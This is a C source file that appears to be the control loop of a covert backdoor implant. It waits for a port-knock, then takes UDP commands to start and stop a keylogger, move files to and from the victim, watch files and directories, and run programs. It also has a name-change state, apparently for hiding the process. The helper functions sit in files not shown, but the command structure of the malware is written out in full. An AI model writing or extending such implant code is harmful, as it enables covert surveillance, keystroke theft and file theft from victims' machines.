#include "fsm.h"
#include "menu_options.h"
#include "udp.h"
#include <arpa/inet.h>
#include <bits/time.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define TIMER_TIME 1

enum main_application_states
{
    STATE_CHANGE_NAME = FSM_USER_START,
    STATE_WAIT_PORT_KNOCK,
    STATE_LISTEN,
    STATE_START_KEYLOG,
    STATE_STOP_KEYLOG,
    STATE_TRANSFER_FILE,
    STATE_GET_FILE,
    STATE_WATCH_FILE,
    STATE_WATCH_DIRECTORY,
    STATE_RUN_PROGRAM,
    STATE_DISCONNECT,
    STATE_UNINSTALL,

    STATE_CLEANUP,
    STATE_ERROR
};

static int change_name_handler(struct fsm_context *context, struct fsm_error *err);
static int wait_port_knock_handler(struct fsm_context *context, struct fsm_error *err);
static int listen_handler(struct fsm_context *context, struct fsm_error *err);
static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err);
static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err);
static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err);
static int get_file_handler(struct fsm_context *context, struct fsm_error *err);
static int watch_file_handler(struct fsm_context *context, struct fsm_error *err);
static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err);
static int run_program_handler(struct fsm_context *context, struct fsm_error *err);
static int disconnect_handler(struct fsm_context *context, struct fsm_error *err);
static int uninstall_handler(struct fsm_context *context, struct fsm_error *err);

static int cleanup_handler(struct fsm_context *context, struct fsm_error *err);
static int error_handler(struct fsm_context *context, struct fsm_error *err);

static void sigint_handler(int signum);
static int  setup_signal_handler(struct fsm_error *err);
static void ignore_sigpipe(void);

static volatile sig_atomic_t exit_flag = 0;

int main(int argc, char **argv)
{
    struct fsm_error err;
    struct arguments args = {
        .connected         = 0,
        .ip_info.dest_port = 3500,
        .ip_info.src_port  = 3600,
    };
    struct fsm_context context = {
        .argc = argc,
        .argv = argv,
        .args = &args,
    };

    uint32_t dest_ip;
    inet_pton(AF_INET, "8.8.8.8", &dest_ip);

    args.ip_info.local_ip = get_local_ip(dest_ip);

    static struct fsm_transition transitions[] = {
        {FSM_INIT,              STATE_CHANGE_NAME,     change_name_handler    },
        {STATE_CHANGE_NAME,     STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},

        {STATE_LISTEN,          STATE_DISCONNECT,      disconnect_handler     },
        {STATE_LISTEN,          STATE_UNINSTALL,       uninstall_handler      },
        {STATE_LISTEN,          STATE_START_KEYLOG,    start_keylog_handler   },
        {STATE_LISTEN,          STATE_STOP_KEYLOG,     stop_keylog_handler    },
        {STATE_LISTEN,          STATE_TRANSFER_FILE,   transfer_file_handler  },
        {STATE_LISTEN,          STATE_GET_FILE,        get_file_handler       },
        {STATE_LISTEN,          STATE_WATCH_FILE,      watch_file_handler     },
        {STATE_LISTEN,          STATE_WATCH_DIRECTORY, watch_directory_handler},
        {STATE_LISTEN,          STATE_RUN_PROGRAM,     run_program_handler    },
        {STATE_LISTEN,          STATE_LISTEN,          listen_handler         },

        {STATE_WAIT_PORT_KNOCK, STATE_LISTEN,          listen_handler         },
        {STATE_START_KEYLOG,    STATE_LISTEN,          listen_handler         },
        {STATE_STOP_KEYLOG,     STATE_LISTEN,          listen_handler         },
        {STATE_TRANSFER_FILE,   STATE_LISTEN,          listen_handler         },
        {STATE_GET_FILE,        STATE_LISTEN,          listen_handler         },
        {STATE_WATCH_FILE,      STATE_LISTEN,          listen_handler         },
        {STATE_WATCH_DIRECTORY, STATE_LISTEN,          listen_handler         },
        {STATE_RUN_PROGRAM,     STATE_LISTEN,          listen_handler         },

        {STATE_DISCONNECT,      STATE_WAIT_PORT_KNOCK, wait_port_knock_handler},
        {STATE_UNINSTALL,       STATE_CLEANUP,         cleanup_handler        },

        {STATE_LISTEN,          STATE_ERROR,           error_handler          },
        {STATE_DISCONNECT,      STATE_ERROR,           error_handler          },
        {STATE_UNINSTALL,       STATE_ERROR,           error_handler          },
        {STATE_START_KEYLOG,    STATE_ERROR,           error_handler          },
        {STATE_STOP_KEYLOG,     STATE_ERROR,           error_handler          },
        {STATE_TRANSFER_FILE,   STATE_ERROR,           error_handler          },
        {STATE_GET_FILE,        STATE_ERROR,           error_handler          },
        {STATE_WATCH_FILE,      STATE_ERROR,           error_handler          },
        {STATE_WATCH_DIRECTORY, STATE_ERROR,           error_handler          },
        {STATE_RUN_PROGRAM,     STATE_ERROR,           error_handler          },

        {STATE_ERROR,           STATE_CLEANUP,         cleanup_handler        },
        {STATE_CLEANUP,         FSM_EXIT,              NULL                   },
    };
    fsm_run(&context, &err, transitions);

    return 0;
}

static int change_name_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;
    SET_TRACE(context, "in parse arguments handler", "STATE_PARSE_ARGUMENTS");
    // if (parse_arguments(ctx->argc, ctx->argv, ctx->args, err) != 0)
    // {
    //     return STATE_ERROR;
    // }

    return STATE_WAIT_PORT_KNOCK;
}

static int wait_port_knock_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in wait port knock", "STATE_RUN_MENU");

    char   timestamp[32];
    size_t timestamp_len = sizeof(timestamp);
    char   src_ip[INET_ADDRSTRLEN];

    if (listen_sequence(timestamp, timestamp_len, src_ip) == 1)
    {
        printf("Knock from %s at %s\n", src_ip, timestamp);
        ctx->args->connected = 1;

        if (inet_pton(AF_INET, src_ip, &ctx->args->ip_info.dest_ip) != 1)
        {
            printf("Invalid IP address.\n");
            return -1;
        }

        printf("sending string\n");
        send_string(ctx->args->ip_info, "yY");
    }

    return STATE_LISTEN;
}

static int listen_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in listen handler", "STATE_LISTEN");

    menu_option opt = receive_menu_option(ctx->args->ip_info);

    switch (opt)
    {
        case DISCONNECT:
            printf("Disconnecting...\n");
            return STATE_DISCONNECT;

        case UNINSTALL:
            printf("Uninstalling...\n");
            return STATE_UNINSTALL;

        case START_KEYLOG:
            printf("Starting keylogger...\n");
            return STATE_START_KEYLOG;

        case STOP_KEYLOG:
            printf("Stopping keylogger...\n");
            return STATE_STOP_KEYLOG;

        case TRANSFER_FILE_TO:
            printf("Transfer file to remote...\n");
            return STATE_TRANSFER_FILE;

        case GET_FILE:
            printf("Getting file from remote...\n");
            return STATE_GET_FILE;

        case WATCH_FILE:
            printf("Watching file...\n");
            return STATE_WATCH_FILE;

        case WATCH_DIR:
            printf("Watching directory...\n");
            return STATE_WATCH_DIRECTORY;

        case RUN_PROGRAM:
            printf("Running program...\n");
            return STATE_RUN_PROGRAM;

        case LISTEN:
            printf("Incorrect Option...\n");
            return STATE_LISTEN;

        default:
            SET_ERROR(err, "Invalid menu option");
            return STATE_ERROR;
    }
}

static int start_keylog_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in start keylog handler", "STATE_START_KEYLOG");

    if (start_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int stop_keylog_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in stop keylog handler", "STATE_STOP_KEYLOG");

    if (stop_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int transfer_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in transfer file handler", "STATE_TRANSFER_FILE");

    if (transfer_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int get_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in get file handler", "STATE_GET_FILE");

    if (get_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int watch_file_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in watch file handler", "STATE_WATCH_FILE");

    if (watch_file(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int watch_directory_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in watch directory handler", "STATE_WATCH_DIRECTORY");

    if (watch_directory(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int run_program_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in run program handler", "STATE_RUN_PROGRAM");

    if (run_program(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_LISTEN;
}

static int disconnect_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in disconnect handler", "STATE_DISCONNECT");

    if (disconnect(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    ctx->args->connected = 0;

    return STATE_WAIT_PORT_KNOCK;
}

static int uninstall_handler(struct fsm_context *context, struct fsm_error *err)
{
    struct fsm_context *ctx;
    ctx = context;

    SET_TRACE(context, "in uninstall handler", "STATE_UNINSTALL");

    if (stop_keylogger(ctx->args->ip_info) != 0)
    {
        return STATE_ERROR;
    }

    return STATE_CLEANUP;
}

static int cleanup_handler(struct fsm_context *context, struct fsm_error *err)
{
    exit_flag++;
    struct fsm_context *ctx;
    ctx = context;
    SET_TRACE(context, "in cleanup handler", "STATE_CLEANUP");

    fsm_error_clear(err);

    return FSM_EXIT;
}

static int error_handler(struct fsm_context *context, struct fsm_error *err)
{
    fprintf(stderr, "ERROR %s\nIn file %s in function %s on line %d\n",
            err->err_msg, err->file_name, err->function_name, err->error_line);

    return STATE_CLEANUP;
}

static void ignore_sigpipe(void)
{
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigaction(SIGPIPE, &sa, NULL);
}
